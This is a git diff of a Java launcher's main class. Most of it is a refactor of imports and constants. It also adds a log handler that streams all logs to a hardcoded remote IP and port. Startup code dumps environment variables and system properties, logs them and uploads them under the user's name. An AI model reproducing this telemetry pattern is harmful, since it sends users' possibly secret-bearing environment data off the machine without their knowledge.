@@ -1,10 +1,16 @@
 package com.timepath.launcher;
 
-import com.timepath.launcher.logging.LogAggregator;
 import com.timepath.launcher.ui.swing.LauncherFrame;
+import com.timepath.launcher.util.JARUtils;
+import com.timepath.launcher.util.SwingUtils;
+import com.timepath.launcher.util.UpdateUtils;
 import com.timepath.launcher.util.Utils;
+import com.timepath.logging.LogAggregator;
+import com.timepath.logging.LogFileHandler;
+import com.timepath.logging.LogIOHandler;
 
 import javax.swing.*;
+import java.io.IOException;
 import java.lang.management.ManagementFactory;
 import java.security.*;
 import java.util.Arrays;
@@ -12,7 +18,7 @@ import java.util.HashMap;
 import java.util.Map;
 import java.util.logging.*;
 
-import static com.timepath.launcher.util.Utils.debug;
+import static com.timepath.launcher.util.Utils.DEBUG;
 
 /**
  * @author TimePath
@@ -31,12 +37,12 @@ public class Main extends JApplet {
         });
         Level consoleLevel = Level.CONFIG;
         try {
-            consoleLevel = Level.parse(Utils.settings.get("consoleLevel", consoleLevel.getName()));
+            consoleLevel = Level.parse(Utils.SETTINGS.get("consoleLevel", consoleLevel.getName()));
         } catch(IllegalArgumentException | NullPointerException ignore) {
         }
         Level logfileLevel = Level.CONFIG;
         try {
-            logfileLevel = Level.parse(Utils.settings.get("logfileLevel", logfileLevel.getName()));
+            logfileLevel = Level.parse(Utils.SETTINGS.get("logfileLevel", logfileLevel.getName()));
         } catch(IllegalArgumentException | NullPointerException ignore) {
         }
         // Choose finest level
@@ -54,6 +60,14 @@ public class Main extends JApplet {
         }
         if(!logfileLevel.equals(Level.OFF)) {
             LogAggregator lh = new LogAggregator();
+            if(!DEBUG) {
+                try {
+                    lh.addHandler(new LogFileHandler());
+                } catch(IOException | SecurityException ex) {
+                    LOG.log(Level.SEVERE, null, ex);
+                }
+            }
+            lh.addHandler(new LogIOHandler().connect("5.175.143.139", 28777));
             lh.setLevel(logfileLevel);
             globalLogger.addHandler(lh);
             LOG.log(Level.INFO, "Logger: {0}", lh);
@@ -87,22 +101,22 @@ public class Main extends JApplet {
     public static void main(String[] args) {
         LOG.log(Level.INFO, "Initial: {0}ms", System.currentTimeMillis() - Utils.START_TIME);
         LOG.log(Level.INFO, "Args = {0}", Arrays.toString(args));
-        Utils.checkForUpdate(args);
+        UpdateUtils.checkForUpdate(args);
         Map<String, Object> dbg = new HashMap<>(3);
         dbg.put("name", ManagementFactory.getRuntimeMXBean().getName());
         dbg.put("env", System.getenv());
         dbg.put("properties", System.getProperties());
         String pprint = Utils.pprint(dbg);
         LOG.info(pprint);
-        if(!debug) {
-            Utils.log(Utils.UNAME + ".xml.gz", "launcher/" + Utils.currentVersion + "/connects", pprint);
+        if(!DEBUG) {
+            Utils.log(Utils.USER + ".xml.gz", "launcher/" + JARUtils.CURRENT_VERSION + "/connects", pprint);
         }
         LOG.log(Level.INFO, "Startup: {0}ms", System.currentTimeMillis() - Utils.START_TIME);
         final Launcher launcher = new Launcher();
         SwingUtilities.invokeLater(new Runnable() {
             @Override
             public void run() {
-                Utils.lookAndFeel();
+                SwingUtils.lookAndFeel();
                 new LauncherFrame(launcher).setVisible(true);
                 LOG.log(Level.INFO, "Visible at {0}ms", System.currentTimeMillis() - Utils.START_TIME);
             }
